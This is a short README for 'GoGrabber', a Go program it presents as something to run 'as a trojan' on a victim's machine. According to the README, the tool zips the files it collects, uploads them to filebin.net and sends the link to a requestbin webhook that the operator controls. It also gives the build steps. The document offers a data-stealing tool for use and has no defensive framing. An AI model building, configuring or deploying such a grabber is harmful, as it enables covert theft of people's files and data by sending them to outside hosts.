

<p align="center">
  <img src="https://i.ibb.co/bNz6sxf/template.png" alt="GoGrabber Logo""/>
</p>


##  Usage

`Usage:  GoGrabber.exe  <arg1>`

One feature of GoGrabber is that you can transfer your ZIP file to "Filebin.net", and send the URL to a webhook if you execute GoGrabber as a trojan.

To establish a new webhook, log in to https://public.requestbin.com first.

Next, modify the code to point to the WebHook's URL using the `webhook` variable.

![Alt text](https://i.ibb.co/X82tXFX/1.png)

The grabber will upload the files to a random URL on https://filebin.net and send the contents to the webhook.

##  Setup

Run the `build.bat` file if you are on Windows machine.

or just run:

`go build -ldflags "-s -w"`

##

![Alt text](https://i.ibb.co/cYKTqQs/2023-12-22-14-55-24.png)

